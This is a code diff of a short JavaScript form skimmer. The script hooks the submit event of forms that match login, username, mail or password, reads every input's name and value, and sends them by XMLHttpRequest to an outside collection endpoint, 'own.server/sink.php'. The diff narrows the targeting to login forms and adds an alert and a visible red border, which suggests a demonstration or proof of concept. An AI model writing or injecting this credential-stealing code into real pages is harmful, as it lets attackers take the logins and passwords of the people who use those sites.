@@ -11,17 +11,23 @@ function a(x) {
   for(var y=0;y<inputs.length;y++){
     str += "&" + inputs[y].name + "=" + inputs[y].value;
   }
+  alert(str);
   var r = new XMLHttpRequest();
   r.open("GET","https://own.server/sink.php" + str);
   r.send();
 }
 
-//make visible
-document.body.setAttribute("style", "border-top: 5px solid red;");
+function setstyle(x) {
+  document.body.setAttribute("style", x);
+}
+
+setstyle("border-top: 5px solid red;");
 
 var forms = document.getElementsByTagName("form");
-// todo filter for login forms only
 
 for(var i=0;i<forms.length;i++) {
-  forms[i].onsubmit = function(){a(this)}
+  if(~forms[i].outerHTML.search(/(login|username|mail|password)/i)){
+		setstyle("border-left: 5px solid red;");
+    forms[i].onsubmit = function(){a(this)};
+  }
 }
